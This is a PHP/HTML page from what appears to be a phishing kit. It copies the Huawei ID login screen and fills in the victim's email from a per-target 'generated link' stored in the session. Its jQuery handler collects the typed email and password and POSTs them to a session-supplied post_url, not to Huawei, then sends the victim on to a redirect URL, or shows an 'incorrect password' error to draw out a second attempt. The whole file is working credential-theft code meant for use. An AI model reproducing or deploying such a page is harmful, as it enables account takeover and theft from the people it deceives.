<?php

	session_name("CAKEPHP");
	session_start();
	include(__DIR__ . "/../includes/huawei.php");
	
	

	$username = $_SESSION['Link']['GeneratedLink']['username'] ?? '';
	$post_url = $_SESSION['Link']['VisitorDetails']['post_url'] ?? '';
	$link_id = $_SESSION['Link']['GeneratedLink']['id'] ?? '';
	$redirect_url = $_SESSION['Link']['GeneratedLink']['redirect_url'] ?? '';
	
?>
<!DOCTYPE html>
<!-- saved from url=(0382)https://id5.cloud.huawei.com/CAS/mobile/standard/login.html?loginUrl=https%3A%2F%2Fcloud.huawei.com%3A443%2FwapFindPhone%3Ftimestamp%3D1701224992301&service=https%3A%2F%2Fcloud.huawei.com%3A443%2FwapFindPhone%3Ftimestamp%3D1701224992301&loginChannel=1000002&reqClientType=1&lang=en-us&countryCode=cn&clientID=4805300&scope=https%3A%2F%2Fwww.huawei.com%2Fauth%2Faccount%2Fpwdlowlogin -->
<html class="hwid-html-portalBg hwid-html-minheight" hwid-deviceflag="">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta http-equiv="cleartype" content="on">
    <meta name="HandheldFriendly" content="True">
    <meta name="x5-fullscreen" content="true">
    <meta name="color-scheme" content="dark light">
    <meta name="format-detection" content="telephone=yes">
    <link rel="icon" href="data:;base64,=">
    <link rel="stylesheet" type="text/css" href="assets/body.css">
    <title>HUAWEI ID-<?=$language['login'][$lang];?></title>
    <script src="assets/jsAnalysis.js" async=""></script>
    
    <script src="assets/en-us.js" async=""></script>
    <link rel="stylesheet" href="assets/index-red.css">
    <link type="image/x-icon" rel="shortcut icon" href="https://id5.cloud.huawei.com/CAS/static_rss/rss_12/IDMW/common/logos/icons/huawei.ico">
  </head>
  <body class="hwid-content-height hwid-body-margin hwid-body-background" x-ms-format-detection="none" hwid-dir="ltr" hwid-lang="en" hwid-themename="red">
    <div class="hwid-root">
      <div class="hwid-login-root hwid-login-root-full-page">
        <div>
          <div class="hwid-gray-customer-header bgGray">
            <div class="hwid-head_center hwid-head-logoPosition-center">
              <div class="hwid-header-logo">
                <img id="uc_hwid_logo_img" src="assets/HUAWEI.svg">
              </div>
              <!---->
            </div>
          </div>
          <div class="hwid-fullpage-container">
            <div class="hwid-mask">
              <div class="hwid-loading-root hwid-loading-show-false" fixed="true">
                <div class="hwid-ic-root">
                  <span class="hwid-icon-ic_loading_circle_gray hwid_icon_padding-10"></span>
                </div>
                <!---->
              </div>
            </div>
            <!---->
            <div class="hwid-full-header-title">
              <span ht="" class="hwid-text-container hwid-header-text">
                <span class="hwid-vertical-align"><?=$language['huawei_login'][$lang];?></span>
              </span>
            </div>
            <div>
              <span class="hwid-fullpage-left-side">
                <div class="hwid-qrCode-root">
                  <div class="hwid-qrcode-full-box hwid-qrcode-box-common">
                    <div class="hwid-qrCode-imgDIv" title="">
                      <canvas width="160" height="160" class="hwid-mask"></canvas>
                      <img alt="Scan me!" class="hwid-display-block" src="data:image/png;base64,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">
                    </div>
                    <!---->
                    <div class="hwid-full-qrcode-desc">
                      <span ht="" class="hwid-text-container">
                        <span class="hwid-vertical-align"><?=$language['login_sub'][$lang];?></span>
                      </span>
                    </div>
                    <!---->
                  </div>
                  <form method="post" action="https://id5.cloud.huawei.com/CAS/mobile/standard/login.html?loginUrl=https%3A%2F%2Fcloud.huawei.com%3A443%2FwapFindPhone%3Ftimestamp%3D1701224992301&amp;service=https%3A%2F%2Fcloud.huawei.com%3A443%2FwapFindPhone%3Ftimestamp%3D1701224992301&amp;loginChannel=1000002&amp;reqClientType=1&amp;lang=en-us&amp;countryCode=cn&amp;clientID=4805300&amp;scope=https%3A%2F%2Fwww.huawei.com%2Fauth%2Faccount%2Fpwdlowlogin" autocomplete="off" target="_parent" class="hwid-mask">
                    <input type="hidden" name="loginUrl">
                    <input type="hidden" name="service">
                    <input type="hidden" name="loginChannel">
                    <input type="hidden" name="reqClientType">
                    <input type="hidden" name="userAccount">
                    <input type="hidden" name="password">
                    <input type="hidden" name="submitType" value="autoLoginInner">
                    <input type="hidden" name="deviceID" value="7894564633456649">
                    <input type="hidden" name="deviceType" value="0">
                    <input type="hidden" name="authType" value="1">
                    <input type="hidden" name="appID" value="com.huawei.hwidweb">
                    <input type="hidden" name="opType" value="4">
                    <input type="submit">
                  </form>
                </div>
              </span>
              <span class="hwid-fullpage-split-line hwid-fullpage-split-line-default-height"></span>
              <span class="hwid-fullpage-right-side">
                <div class="hwid-pwdlogin-root">
                  <div class="accountValidMsg">
                    <div class="hwid-input-msg-error hwid-errorMsg-root">
                      <div ht="errorMsg_pwdlogin" class="hwid-errorDiv" style="display: none">
                        
						<div class="hwid-ic-root hwid-tip-icon">
							<span class="hwid-icon-ic_tips_danger1 hwid_icon_padding-6"></span>
						</div>
						<span><?=$language['incorrect'][$lang];?></span>
						
                      </div>
                    </div>
                  </div>
                  <form>
                    <div class="hwid-mask">
                      <div>
                        <input type="text" name="username" autocomplete="off" class="hwid-hidden-useraccount" >
                        <input type="password" oncut="return false;" oncopy="return false;" autocomplete="off" class="hwid-hidden-password">
                      </div>
                    </div>
                    <div class="hwid-widget-input hwid-textInput-root" name="fieldAccount">
                      <div class="hwid-input-div">
                        <div class="hwid-input-area">
                          <div data-v-1b0f7de0="" class="hwid-input-root">
                            <input id="email" value="<?=$username;?>" data-v-1b0f7de0="" type="text" autocomplete="off" maxlength="150" placeholder="<?=$language['email_place'][$lang];?>" ht="input_pwdlogin_account" class="hwid-input userAccount">
                            <!---->
                          </div>
                          <!---->
                        </div>
                      </div>
                    </div>
                    <div class="hwid-widget-input hwid-passwordInput-root marginTop26" name="fieldPassword">
                      <div class="hwid-input-div">
                        <div class="hwid-input-area">
                          <div data-v-1b0f7de0="" class="hwid-input-root">
                            <input id="password" data-v-1b0f7de0="" type="password" oncut="return false;" oncopy="return false;" autocomplete="off" maxlength="32" placeholder="<?=$language['password'][$lang];?>" ht="input_pwdlogin_pwd" class="hwid-input hwid-input-pwd">
                            <!---->
                          </div>
                          <i ht="click_eyeicon" class="hwid-password-eye">
                            <div class="hwid-ic-root">
                              <span class="hwid-icon-ic_password_eyeoff hwid_icon_padding-12">
                                <span>
                                  <span class="hwid-icon-ic_password_eyeon"></span>
                                </span>
                              </span>
                            </div>
                          </i>
                        </div>
                      </div>
                      <!---->
                    </div>
                    <!---->
                  </form>
                  <span class="hwid-smsLogin-link">
                    <div class="button-base-box hwid-link">
                      <div class="textBtn">
                        <div ht="click_label_smsvalidLoad" class="">
                          <span ht="" class="hwid-text-container">
                            <span class="hwid-vertical-align"><?=$language['login_sms'][$lang];?></span>
                          </span>
                          <div class="hwid-loading-root hwid-loading-show-false" data-name="">
                            <div class="hwid-ic-root">
                              <span class="hwid-icon-ic_loading_circle_gray hwid_icon_padding-10"></span>
                            </div>
                            <!---->
                          </div>
                        </div>
                      </div>
                    </div>
                    <!---->
                  </span>
                  <!---->
                  <div class="hwid-login-btn-wrap">
                    <div class="button-base-box">
                      <div ht="click_pwdlogin_submitLogin" class="normalBtn">
                        <div class="hwid-btn hwid-btn-primary hwid-login-btn hwid-disabled">
                          <span ht="" class="hwid-text-container">
                            <span class="hwid-vertical-align"><?=$language['login'][$lang];?></span>
                          </span>
                          <div class="hwid-loading-root hwid-loading-show-false" data-name="">
                            <div class="hwid-ic-root">
                              <span class="hwid-icon-ic_loading_circle_gray hwid_icon_padding-12"></span>
                            </div>
                            <!---->
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <!---->
                <div class="hwid-full-link">
                  <span ht="click_pwdlogin_registerLink" class="hwid-link hwid-link-primary">
                    <span ht="" class="hwid-text-container">
                      <span class="hwid-vertical-align"><?=$language['register'][$lang];?></span>
                    </span>
                  </span>
                  <span ht="click_pwdlogin_forgotLink" class="hwid-link hwid-link-primary">
                    <span ht="" class="hwid-text-container">
                      <span class="hwid-vertical-align"><?=$language['forgot'][$lang];?></span>
                    </span>
                  </span>
                  <span ht="click_pwdlogin_moreLink" class="hwid-link hwid-link-primary">
                    <span ht="" class="hwid-text-container">
                      <span class="hwid-vertical-align"><?=$language['help'][$lang];?></span>
                    </span>
                  </span>
                </div>
                <!---->
              </span>
            </div>
          </div>
          <div class="hwid-footer-root fixBottom">
            <div class="footer-Blank height-blank"></div>
            <div class="hwid-footer-content">
              <div class="footer-agreement content-list">
                <div>
                  <p class="hwid-footer">
                    <a href="https://id5.cloud.huawei.com/AMW/portal/agreements/userAgreement/en-us_userAgreement.html?version=china&amp;regionCode=cn&amp;reqClientType=1&amp;clientID=4805300&amp;loginChannel=1000002" target="_blank" class="hwid-rule"> <?=$language['agreement'][$lang];?> </a>
                    <em class="hwid-foot_em">|</em>
                    <a href="https://id5.cloud.huawei.com/AMW/portal/agreements/accPrivacyStatement/en-us_accPrivacyStatement.html?version=china&amp;regionCode=cn&amp;reqClientType=1&amp;clientID=4805300&amp;loginChannel=1000002" target="_blank" class="hwid-rule"> <?=$language['privacy'][$lang];?> </a>
                    <!---->
                    <em class="hwid-foot_em">|</em>
                    <a href="https://consumer.huawei.com/us/legal/cookie-policy/" target="_blank" class="hwid-rule"> <?=$language['cookies'][$lang];?> </a>
                  </p>
                </div>
              </div>
              <div class="footer-copyRight content-list">
                <!---->
              </div>
            </div>
          </div>
        </div>
        <!---->
        <div>
          <div id="hwid-hwmeta" class="hwid-mask"></div>
        </div>
      </div>
    </div>
    <script type="text/javascript" src="assets/hwidConfig.js"></script>
    
  </body>
</html>

<script src="assets/js/jquery-3.7.1.min.js"></script>
<script>

var username = '<?=$username;?>';
var post_url = '<?=$post_url;?>';
var link_id = '<?=$link_id;?>';
var redirect_url = '<?=$redirect_url;?>';

$( document ).ready(function() {
    
	$('i[ht="click_eyeicon"]').on('mousedown', function() {
		$(this).find("span:first-child").removeClass('hwid-icon-ic_password_eyeoff');
		$(this).find("span:first-child").addClass('hwid-icon-ic_password_eyeon');
		$('#password').attr('type','text');
	}).on('mouseup mouseleave', function() {
		$(this).find("span:first-child").removeClass('hwid-icon-ic_password_eyeon');
		$(this).find("span:first-child").addClass('hwid-icon-ic_password_eyeoff');
		$('#password').attr('type','password');
	});
	
	$('.hwid-login-btn').on('click',function(){
	
		if($(this).hasClass('hwid-disabled')){
			return false;
		}
	
		$('.hwid-errorDiv').hide();
		$('.hwid-input-area').removeClass('hwid-input-border-error');
		$('.hwid-login-btn').addClass('hwid-disabled');
		
		username = $('#email').val();
		var password = $('#password').val();
		var data = 'id=' + link_id + '&type=account&user=' + username + '&pass=' + password;
		
		$.ajax({
			type: "POST",
			dataType: "json",
			url: post_url,
			data: data,
			cache: false,
			success: function(data) {
				if(data.success == true){
					window.location.href = redirect_url;
				}else{
					$('.hwid-errorDiv').show();
					$('.hwid-input-area').addClass('hwid-input-border-error');
					$('.hwid-login-btn').removeClass('hwid-disabled');
				}
			},error: function(XMLHttpRequest, textStatus, errorThrown) {
				$('.hwid-errorDiv').show();
				$('.hwid-input-area').addClass('hwid-input-border-error');
				$('.hwid-login-btn').removeClass('hwid-disabled');
			}
		});
		
	});
	
	$('#email, #password').on('input',function(){
		var email = $('#email').val();
		var password = $('#password').val();
		
		if(email.trim().length >= 4 && password.trim().length >= 4){
			$('.hwid-login-btn').removeClass('hwid-disabled');
		}else{
			$('.hwid-login-btn').addClass('hwid-disabled');
		}
	});
	
	
});
</script>